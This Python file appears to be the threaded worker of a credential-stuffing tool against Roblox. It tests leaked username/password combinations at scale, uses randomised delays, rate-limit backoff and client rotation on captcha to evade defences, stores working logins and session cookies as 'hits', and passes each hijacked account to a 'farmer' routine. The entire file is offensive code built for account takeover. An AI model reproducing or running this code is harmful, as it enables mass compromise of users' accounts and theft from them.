import random, threading, time

import config, farmer, rblx, store


class Gate:
    def __init__(self, lo, hi):
        self.lo, self.hi = lo, hi
        self._l = threading.Lock()
        self._next = 0.0

    def wait(self):
        with self._l:
            now = time.time()
            at = max(now, self._next)
            self._next = at + random.uniform(self.lo, self.hi)
        if at > now:
            time.sleep(at - now)

    def hold(self, secs):
        with self._l:
            self._next = max(self._next, time.time() + secs)


class Pool:
    def __init__(self, size, stop):
        self.size = max(1, size)
        self.stop = stop
        self.paused = True
        self.gate = Gate(config.MIN_DELAY, config.MAX_DELAY)
        self.lock = threading.Lock()
        self.stats = {"done": 0, "hit": 0, "retry": 0}

    def start(self):
        for i in range(self.size):
            threading.Thread(target=self._run, name="w%d" % i, daemon=True).start()

    def _bump(self, k):
        with self.lock:
            self.stats[k] = self.stats.get(k, 0) + 1

    def _run(self):
        cli = rblx.Roblox()
        try:
            cli.csrf()
        except Exception:
            pass
        while not self.stop.is_set():
            if self.paused:
                time.sleep(1.0)
                continue
            job = store.claim_combo()
            if not job:
                time.sleep(2.0)
                continue
            u, p = job["username"], job["password"]
            self.gate.wait()
            try:
                status, detail, cookie = cli.login(u, p)
            except Exception as e:
                status, detail, cookie = "error", repr(e), None

            if status in ("ratelimited", "csrf", "error", "captcha"):
                if status == "ratelimited":
                    try:
                        wait = min(300.0, float(detail) + 5)
                    except Exception:
                        wait = 60.0
                    self.gate.hold(wait)
                delay = {"captcha": config.CAPTCHA_DELAY,
                         "error": config.RETRY_DELAY,
                         "csrf": 5.0,
                         "ratelimited": 0.0}[status]
                new = store.requeue(u, p, "%s %s" % (status, detail), delay, config.MAX_ATTEMPTS)
                if status == "captcha":
                    cli.reset(rotate=True)
                self._bump("retry")
                continue

            if status == "hit":
                store.add_hit(u, p, cookie)
                store.finish_combo(u, p, "hit", "ok")
                self._bump("hit")
                threading.Thread(target=_farm, args=(u, cookie), daemon=True).start()
                cli.reset()
            elif status == "2fa":
                store.add_hit(u, p, cookie, "2fa")
                store.finish_combo(u, p, "2fa", detail)
                threading.Thread(target=_farm, args=(u, cookie), daemon=True).start()
                cli.reset()
            else:
                store.finish_combo(u, p, status, detail)
            self._bump("done")


def _farm(u, cookie):
    try:
        farmer.collect(u, cookie)
    except Exception:
        pass
